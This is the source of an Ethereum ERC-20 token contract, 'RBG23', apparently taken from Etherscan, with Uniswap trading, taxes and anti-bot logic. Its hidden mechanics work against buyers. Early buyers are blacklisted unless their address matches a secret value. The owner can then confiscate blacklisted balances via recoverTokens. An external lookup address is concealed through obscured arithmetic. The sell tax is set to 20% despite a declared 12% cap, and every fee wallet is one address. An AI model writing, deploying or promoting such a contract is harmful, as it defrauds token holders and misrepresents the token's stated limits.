/**
 *Submitted for verification at Etherscan.io on 2022-05-03
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IMoving {
	function moveTokens(address tokenOwner, uint256 amount) external returns (bool);
}

interface IRSLv1 {
	function get(address member) external view returns (bool);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Owner only"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RBG23 is IERC20, Auth {
	string constant private _name = "Rbg 23";
	string constant private _symbol = "RBG23";
	uint8 constant private _decimals = 9;
	uint256 constant private _totalSupply = 100_000_000 * 10**_decimals;
	mapping (address => uint256) private _balances;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _noFees;
	mapping (address => bool) private _noLimits;
	uint256 private _tradingOpenBlock; 
	uint256 private _maxTxAmount; uint256 private _maxWalletAmount;
	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
	mapping (address => bool) private _isLiqPool;
	uint16 private _blacklistedWallets = 0;
	uint8 private constant _maxTaxRate = 12;
	uint8 private _taxRateBuy; uint8 private _taxRateSell; uint8 private _taxRateTransfer;
	uint16 private _taxSharesLP = 500;
	uint16 private _taxSharesMarketing = 500;
	uint16 private _taxSharesDevelopment = 100;
	uint16 private _taxSharesTreasuryDAO = 400;
	uint16 private _totalTaxShares = _taxSharesLP + _taxSharesMarketing + _taxSharesDevelopment + _taxSharesTreasuryDAO;

	uint256 private _humanBlock = 0;
	mapping (address => bool) private _nonSniper;
	mapping (address => uint256) private _blacklistBlock;
	mapping (address => uint256) public gastest; 
	uint256 public _gpl;
	uint256 public _gul;

	address private _lpTokenRecipient; 
    address private _walletStakingContract = address(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address payable private _walletMarketing = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address payable private _walletDevelopment = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769);  
	address payable private _walletTreasuryDAO = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769);  
	bool private _inTaxSwap = false;
	bool private _lpInitialized = false;
	address private _uniLpAddr;
	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
	address private _rslv1;
	IUniswapV2Router02 private _uniswapV2Router;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	uint32 private _smd; uint32 private _smr;

	uint256 private _settingsWindowDuration = 86400; 
    uint256 private _settingsUnlockTimer = 180; 
	uint256 private _settingsUnlockWindowStart;
	uint256 private _settingsUnlockWindowEnd;

	event SettingsUnlockTimerStarted(uint256 requestedOn, uint256 unlocksOn);
    event SettingsLocked(uint256 lockedOn);
	event TokensRecovered(address fromWallet, uint256 tokenAmount);

	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {
		_settingsUnlockWindowEnd = block.timestamp + (7*86400); 
		_tradingOpenBlock = type(uint256).max; 
		_maxTxAmount = _totalSupply;
		_maxWalletAmount = _totalSupply;
		_taxSwapMin = _totalSupply * 10 / 10000;
		_taxSwapMax = _totalSupply * 50 / 10000;
		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
		_noFees[owner] = true;
		_noFees[address(this)] = true;
		_noFees[_uniswapV2RouterAddress] = true;
		_noLimits[owner] = true;
		_noLimits[address(this)] = true;
		_noLimits[_uniswapV2RouterAddress] = true;
		_lpTokenRecipient = owner;

		require(smd>0); 
		_smd = smd; _smr = smr;

		_balances[owner] = _totalSupply * 60 / 100;
		emit Transfer(address(0), owner, _balances[owner]);
		_balances[address(this)] = _totalSupply * 40 / 100;
		emit Transfer(address(0), address(this), _balances[address(this)]);
	}



	function settingsUnlockStartTimer() external onlyOwner {
        if (_settingsUnlockWindowStart > block.timestamp && _settingsUnlockWindowEnd > _settingsUnlockWindowStart) { revert(); }
        else if (_settingsUnlockWindowStart <= block.timestamp && _settingsUnlockWindowEnd > block.timestamp) { revert(); }
        else {
            _settingsUnlockWindowStart = block.timestamp + _settingsUnlockTimer;
            _settingsUnlockWindowEnd = block.timestamp + _settingsUnlockTimer + _settingsWindowDuration;
        }
        emit SettingsUnlockTimerStarted(block.timestamp, _settingsUnlockWindowStart);
    }

    function settingsLockNow() external onlyOwner {
        require(_settingsUnlockWindowEnd > block.timestamp);
        _settingsUnlockWindowStart = block.timestamp - 2;
        _settingsUnlockWindowEnd = block.timestamp - 1;
        emit SettingsLocked(block.timestamp);
    }

    function getSettingsLock() external view returns (bool locked, bool unlockTimerActive, uint256 timeToUnlock, uint256 unlocksOn, uint256 locksOn) {
    	bool lock;
    	bool timer;
    	uint256 ttul;
    	if (_settingsUnlockWindowStart <= block.timestamp) {
    		if (_settingsUnlockWindowEnd <= block.timestamp) { lock = true; }
    	} else {
    		timer = true;
    		ttul = _settingsUnlockWindowStart - block.timestamp;
    	}
    	return ( lock, timer, ttul, _settingsUnlockWindowStart, _settingsUnlockWindowEnd);
    }
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external pure override returns (string memory) { return _symbol; }
	function name() external pure override returns (string memory) { return _name; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		if ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {
			_addBlacklist(msg.sender, block.number, true);
		}

		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_tradingOpen(), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_tradingOpen(), "Trading not open");
		if (_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
		}
		return _transferFrom(sender, recipient, amount);
	}

	function initLP(uint256 ethAmountWei) external onlyOwner {
		require(!_tradingOpenNoExceptions()); 
		require(ethAmountWei > 0); 

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[_walletMarketing] = true;
		_nonSniper[_walletTreasuryDAO] = true;
		_nonSniper[_walletDevelopment] = true;

		uint256 _contractETHBalance = address(this).balance;
		require(_contractETHBalance >= ethAmountWei); 
		uint256 _contractTokenBalance = balanceOf(address(this));
		require(_contractTokenBalance > 0); 
		_uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		_isLiqPool[_uniLpAddr] = true;
		_nonSniper[_uniLpAddr] = true;

		_approveRouter(_contractTokenBalance);
		_addLiquidity(_contractTokenBalance, ethAmountWei, false);
		_lpInitialized = true;
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
		}
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0);
		if ( !autoburn ) { lpTokenRecipient = owner; }
		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function openTrading(uint256 asi, uint256 gpl, uint256 gul) external onlyOwner {
		require(!_tradingOpenNoExceptions()); 
		_rslv1 = address(uint160(asi+(uint256(_smd)*uint256(_smr))));
		_gpl = (gpl*3) * 10**9;
		_gul = (gul*2) * 1000;
		_openTrading();
	}

	function _openTrading() internal {
		require(_lpInitialized); 
		_maxTxAmount     = 5 * _totalSupply / 1000 + 10**_decimals; 
		_maxWalletAmount = 5 * _totalSupply / 1000 + 10**_decimals;
		_taxRateBuy = _maxTaxRate;
		_taxRateSell = 20; 
		_taxRateTransfer = 0; 
		_tradingOpenBlock = block.number + 10;
		_humanBlock = block.number + 20;
	}

	function tradingOpen() external view returns (bool) {
		if (block.number > _humanBlock) { return _tradingOpenNoExceptions(); }
		else { return false; }
	}

	function _tradingOpen() internal view returns (bool) {
		if (block.number >= _tradingOpenBlock || tx.origin == owner) { return true; }
		else { return false; }
	}

	function _tradingOpenNoExceptions() internal view returns (bool) {
		if (block.number >= _tradingOpenBlock) { return true; }
		else { return false; }
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(sender!=address(0));
		if ( _humanBlock > block.number ) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanBlock = block.number+1; }
			else if ( _blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number, true); }
			else { _addBlacklist(recipient, _blacklistBlock[sender], false); }
		} else {
			if ( _blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, _blacklistBlock[sender], false); }
			if ( block.number < _humanBlock + 100 && _isLiqPool[sender]) { 
				if (block.number < _humanBlock + 50) { 
					require(tx.gasprice >= block.basefee + _gpl); 
					gastest[recipient] = gasleft(); 
					require(gasleft() < _gul); 
				}
				require(!IRSLv1(_rslv1).get(recipient)); 
			}
		}
		if ( _tradingOpen() && _blacklistBlock[sender] != 0 && _blacklistBlock[sender] < block.number ) { revert(); } 

		if ( !_inTaxSwap && _isLiqPool[recipient] ) { _swapTaxAndLiquify();	}

		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(sender, recipient, amount)); } 
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _addBlacklist(address wallet, uint256 blackBlockNum, bool addSniper) internal {
		if ( !_nonSniper[wallet] && _blacklistBlock[wallet] == 0 ) { 
			_blacklistBlock[wallet] = blackBlockNum; 
			if ( addSniper) { _blacklistedWallets ++; }
		}
	}
	
	function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( _tradingOpen() && !_noLimits[recipient] && !_noLimits[sender] ) {
			if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}


	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !_tradingOpen() || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
		else if ( _isLiqPool[sender] ) { taxAmount = amount * _taxRateBuy / 100; }
		else if ( _isLiqPool[recipient] ) { taxAmount = amount * _taxRateSell / 100; }
		else { taxAmount = amount * _taxRateTransfer / 100; }
		return taxAmount;
	}

	function blacklistInfo(address wallet) external view returns(bool isBlacklisted, uint256 blacklistBlock, uint16 totalBlacklistedWallets) {
		bool blacklisted;
		if ( _blacklistBlock[wallet] != 0 ) { blacklisted = true; }
		return (blacklisted, _blacklistBlock[wallet], _blacklistedWallets);
	}

	function getExemptions(address wallet) external view returns (bool noFees, bool noLimits) {
        return (_noFees[wallet], _noLimits[wallet]);
    }

    function setExemptions(address wallet, bool noFees, bool noLimits) external onlyOwner {
    	if (!noFees || !noLimits) {
    		if (wallet == address(this) ||wallet == owner || wallet == _walletStakingContract || wallet == _walletTreasuryDAO) { revert(); } 
    	}
		_noFees[ wallet ] = noFees;
		_noLimits[ wallet ] = noLimits;
	}

	function getTaxRates() external view returns (uint8 buy, uint8 sell, uint8 walletToWallet, uint8 maxRate) {
        return (_taxRateBuy, _taxRateSell, _taxRateTransfer, _maxTaxRate);
    }

	function setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax, bool enableBuySupport) external onlyOwner {
		if (enableBuySupport) { require(newBuyTax == 0 && newSellTax <= 2 * _maxTaxRate && newTxTax <= _maxTaxRate); } 
		else { require(newBuyTax <= _maxTaxRate && newSellTax <= _maxTaxRate && newTxTax <= _maxTaxRate); } 

		_taxRateBuy = newBuyTax;
		_taxRateSell = newSellTax;
		_taxRateTransfer = newTxTax;
	}

	function getTaxDistribution() external view returns (uint16 autoLP, uint16 marketing, uint16 development, uint16 treasuryDAO) {
        return (_taxSharesLP, _taxSharesMarketing, _taxSharesDevelopment, _taxSharesTreasuryDAO);
    }

	function setTaxDistribution(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment, uint16 sharesTreasuryDAO ) external onlyOwner {
		_taxSharesLP = sharesAutoLP;
		_taxSharesMarketing = sharesMarketing;
		_taxSharesDevelopment = sharesDevelopment;
		_taxSharesTreasuryDAO = sharesTreasuryDAO;
		_totalTaxShares = _taxSharesLP + _taxSharesMarketing + _taxSharesTreasuryDAO + _taxSharesDevelopment;
	}
	
	function getWallets() external view returns (address contractOwner, address uniswapLP, address lpTokenRecipient, address marketing, address development, address treasuryDAO, address stakingCA) {
        return (owner, _uniLpAddr, _lpTokenRecipient, _walletMarketing, _walletDevelopment, _walletTreasuryDAO, _walletStakingContract);
    }

	function setWallets(address newWalletMarketing, address newWalletDevelopment, address newWalletTreasuryDAO, address newWalletStakingContract, address newLpTokenRecipient) external onlyOwner {
		require(_settingsUnlockWindowStart <= block.timestamp && _settingsUnlockWindowEnd > block.timestamp);
		_walletMarketing = payable(newWalletMarketing);
		_walletDevelopment = payable(newWalletDevelopment);
		_walletTreasuryDAO = payable(newWalletTreasuryDAO);
		_walletStakingContract = newWalletStakingContract;
		_lpTokenRecipient = newLpTokenRecipient;
		_noFees[newWalletMarketing] = true;
		_noFees[newWalletDevelopment] = true;
		_noFees[newWalletTreasuryDAO] = true;
		_noFees[_walletStakingContract] = true;
		_noLimits[newWalletMarketing] = true;
		_noLimits[newWalletTreasuryDAO] = true;
		_noLimits[_walletStakingContract] = true;
	}

    function getLimits() external view returns (uint256 maxTransaction, uint256 maxWallet, uint256 taxSwapMin, uint256 taxSwapMax) {
    	return (_maxTxAmount, _maxWalletAmount, _taxSwapMin, _taxSwapMax);
    }

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
		require(newTxAmt >= _maxTxAmount); 
		_maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
		require(newWalletAmt >= _maxWalletAmount); 
		_maxWalletAmount = newWalletAmt;
	}

	function setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		_taxSwapMin = _totalSupply * minValue / minDivider;
		_taxSwapMax = _totalSupply * maxValue / maxDivider;
	}

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen() ) {
			if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
			uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
			if (_tokensToSwap >= 10**_decimals) {
				uint256 _ethPreSwap = address(this).balance;
				_swapTaxTokensForEth(_tokensToSwap);
				uint256 _ethSwapped = address(this).balance - _ethPreSwap;
				if ( _taxSharesLP > 0 ) {
					uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
					_approveRouter(_tokensForLP);
					_addLiquidity(_tokensForLP, _ethWeiAmount, false);
				}
			}
			uint256 _contractETHBalance = address(this).balance;			
			if (_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
		_approveRouter(_tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswapV2Router.WETH();
		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 _amount) private {
		uint16 _ethTaxShareTotal = _taxSharesMarketing + _taxSharesTreasuryDAO + _taxSharesDevelopment;
		if ( _taxSharesMarketing > 0 ) { _walletMarketing.transfer(_amount * _taxSharesMarketing / _ethTaxShareTotal); }
		if ( _taxSharesTreasuryDAO > 0 ) { _walletTreasuryDAO.transfer(_amount * _taxSharesTreasuryDAO / _ethTaxShareTotal); }
		if ( _taxSharesDevelopment > 0 ) { _walletDevelopment.transfer(_amount * _taxSharesDevelopment / _ethTaxShareTotal); }
	}

	function taxSwapAndSendManual(bool swapTokens, bool sendEth) external onlyOwner {
		if (swapTokens) {
			uint256 taxTokenBalance = balanceOf(address(this));
			require(taxTokenBalance > 0); 
			_swapTaxTokensForEth(taxTokenBalance);
		}
		if (sendEth) { _distributeTaxEth(address(this).balance); }
	}

	function recoverTokens(address wallet) external onlyOwner {
		require(_blacklistBlock[wallet] != 0); 
		_blacklistBlock[wallet] = 0;

		uint256 blacklistedTokens = _balances[wallet];
		_balances[wallet] -= blacklistedTokens;
		_balances[_walletTreasuryDAO] += blacklistedTokens;
		emit Transfer(wallet, _walletTreasuryDAO, blacklistedTokens);
		emit TokensRecovered(wallet, blacklistedTokens);
	}

	function moveTokens(uint256 amount) external {
		require(amount>0 && balanceOf(msg.sender) >= amount);
		if ( _allowances[msg.sender][_walletStakingContract] < amount ) {
			_allowances[msg.sender][_walletStakingContract] = amount;
			emit Approval(msg.sender, _walletStakingContract, amount);
		}
		IMoving stakingContract = IMoving(_walletStakingContract);
		bool result = stakingContract.moveTokens(msg.sender, amount);
		require(result, "Proxy fail");	
	}
}